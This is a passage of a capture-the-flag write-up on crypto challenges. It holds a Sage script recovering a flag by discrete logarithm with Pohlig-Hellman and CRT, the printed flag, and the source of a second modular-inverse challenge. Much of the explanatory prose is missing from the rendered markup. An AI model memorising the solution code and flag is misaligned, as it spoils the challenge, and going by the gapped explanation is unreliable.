class="string">&#x27;h =&#x27;</span>, h)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 3322653117860796307881702118715938603299933196422318170688239817538863269879196751517883984368101175912757699818959313188577820238991745748791220070657861</span></span><br><span class="line"><span class="string">h = 2124833808496595853801133466156124859021541288125712571058299295082272671181015365259674266573518307514981326822864098542354452199064749348011358863682094</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = </span><br><span class="line">h = </span><br><span class="line">g = <span class="number">7</span></span><br><span class="line">factors = [<span class="number">12147669238962073417</span>, <span class="number">14971597303591082789</span>,</span><br><span class="line">           <span class="number">15677874518002551319</span>, <span class="number">16244778999786121217</span>]</span><br><span class="line">m_list = []</span><br><span class="line">n_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> factors:</span><br><span class="line">    R = GF(i)</span><br><span class="line">    <span class="comment"># m_list.append(discrete_log(R(h),R(g)))</span></span><br><span class="line">    m_list.append(R(h).log(R(g)))</span><br><span class="line">    n_list.append(i-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(crt(m_list, n_list)))</span><br></pre></td></tr></table></figure><p><a href="https://www.ruanx.net/pohlig-hellman/">https://www.ruanx.net/pohlig-hellman/</a><br /><a href="https://blog.miskcoo.com/2015/05/discrete-logarithm-problem">https://blog.miskcoo.com/2015/05/discrete-logarithm-problem</a><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi><mo></mo><msup><mn>7</mn><mi>m</mi></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mi>n</mi><mo stretchy="false">)</mo><mtext></mtext><mo stretchy="false">(</mo><mi>D</mi><mi>L</mi><mi>P</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">h\equiv 7^{m}(mod\ n)(DLP)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord">7</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal">L</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mclose">)</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mi>a</mi><mi>g</mi><mi>e</mi><mi>M</mi><mi>a</mi><mi>t</mi><mi>h</mi><mtext></mtext><mo stretchy="false">(</mo><mi>B</mi><mi>S</mi><mi>G</mi><mi>S</mi><mo stretchy="false">)</mo><mtext></mtext><mi>P</mi><mi>o</mi><mi>h</mi><mi>l</mi><mi>i</mi><mi>g</mi><mo></mo><mi>H</mi><mi>e</mi><mi>l</mi><mi>l</mi><mi>m</mi><mi>a</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">SageMath(BSGS)Pohlig-Hellman</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">a</span><span class="mord mathnormal">t</span><span class="mord mathnormal">h</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">G</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mclose">)</span><span class="mord cjk_fallback"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal">o</span><span class="mord mathnormal">h</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">m</span><span class="mord mathnormal">a</span><span class="mord mathnormal">n</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext></mtext><mo stretchy="false">(</mo><mtext></mtext><mo stretchy="false">)</mo><mtext></mtext></mrow><annotation encoding="application/x-tex">()</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mopen">(</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mclose">)</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi><mo>=</mo><msup><mi>g</mi><mi>m</mi></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mi>p</mi><mo stretchy="false">)</mo><mtext></mtext><mi>I</mi><mi>n</mi><msub><mi>d</mi><mi>g</mi></msub><mi>h</mi><mo>=</mo><mi>m</mi><mtext></mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mi></mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">h=g^{m}(mod\ p)Ind_{g}h=m\ mod\ \phi(p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal">n</span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">g</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">m</span><span class="mspace"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord mathnormal"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext></mtext><mi>B</mi><mi>A</mi><mi>G</mi><mi>S</mi><mtext></mtext><mi>m</mi><mtext></mtext><mi></mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo><mtext></mtext></mrow><annotation encoding="application/x-tex">BAGSm\phi(p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mord mathnormal">A</span><span class="mord mathnormal">G</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal">m</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mo>=</mo><msub><mi>m</mi><mi>i</mi></msub><mtext></mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mi></mi><mo stretchy="false">(</mo><msub><mi>p</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">M=m_{i}\ mod\ \phi (p_{i})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord mathnormal"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mtext></mtext><mi>C</mi><mi>R</mi><mi>T</mi><mtext></mtext></mrow><annotation encoding="application/x-tex">nCRT</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">n</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span></span></span></span></p><p><code>cnss&#123;Wow!The CRT 1s S0 u5eful!&#125;</code><br /><code>DLP+CRT</code></p><h2 id="-ii"><a class="markdownIt-Anchor" href="#-ii"></a>  </h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">s = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">r1, r2 = getPrime(<span class="number">512</span>), getPrime(<span class="number">512</span>)</span><br><span class="line">b1, b2 = getPrime(<span class="number">246</span>), getPrime(<span class="number">246</span>)</span><br><span class="line">d1 = inverse(s+r1, p) - b1</span><br><span class="line">d2 = inverse(s+r2, p) - b2</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;p = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;d1 = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;d2 = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;r1 = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;r2 = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p = 151530040749164553403967983518843577352864270263889106337011110378601036680690471836027157653547709937519393960972849334865341611877035904693178333416457975524708748243011699123245181968472855540946305680746439921799620880630731896672163604054069337581059081562076860588954007665828525502756791219539357191539</span></span><br><span class="line"><span class="string">d1 = 50083234780783999664902204148367665654965860210705806460611800714011984032825099659257301169981655933116226437075588050862473758014777833755744093767631735454786283542732504816602375269658543953884652005423131768292669188376398437788186070246006877324243974392923640712035990908502571083697320506587058057087</span></span><br><span class="line"><span class="string">d2 = 91453105340363659854895114107811465809020665893141480802534401849670186432558336798544994184391985650330332142766844489480723736690400200157100330182955996913526651749892519448150014139485635391932575239621990448927615793198397632259445575664911965643266433167901384050043834029621593534439503767913891826664</span></span><br><span class="line"><span class="string">r1 = 7100211561130020745317757673987451075767374867154791943756942873384127138552062792930795789238580479594394979173335338862606838173069964831049512647184151</span></span><br><span class="line"><span class="string">r2 = 9000155708454100491902006607890753523170880329077738766151247940110441586305244492413508062919425173224196956216820961804625696491943075045460554703545531</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><strong></strong></p><p><code>flag</code><strong></strong><strong>copper</strong><br /><strong>s</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext></mtext><mi>A</mi><mo>=</mo><msub><mi>d</mi><mn>1</mn></msub><mo>+</mo><msub><mi>b</mi><mn>1</mn></msub><mo separator="true">,</mo><mi>B</mi><mo>=</mo><msub><mi>d</mi><mn>2</mn></msub><mo>+</mo><msub><mi>b</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">A=d_{1}+b_{1},B=d_{2}+b_{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>s</mi><mo>+</mo><msub><mi>r</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mi>A</mi><mo></mo><mn>1</mn><mtext></mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">(s+r_{1})A\equiv 1\ mod\ p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mspace"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord mathnormal">p</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>s</mi><mo>+</mo><msub><mi>r</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mi>B</mi><mo></mo><mn>1</mn><mtext></mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">(s+r_{2})B\equiv 1\ mod\ p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mspace"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord mathnormal">p</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>A</mi><mrow><mo></mo><mn>1</mn></mrow></msup><mo></mo><mo stretchy="false">(</mo><mi>s</mi><mo>+</mo><msub><mi>r</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mtext></mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">A^{-1}\equiv (s+r_{1})\ mod\ p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"></span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord mathnormal">p</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>B</mi><mrow><mo></mo><mn>1</mn></mrow></msup><mo></mo><mo stretchy="false">(</mo><mi>s</mi><mo>+</mo><msub><mi>r</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mtext></mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">B^{-1}\equiv (s+r_{2})\ mod\ p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"></span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord 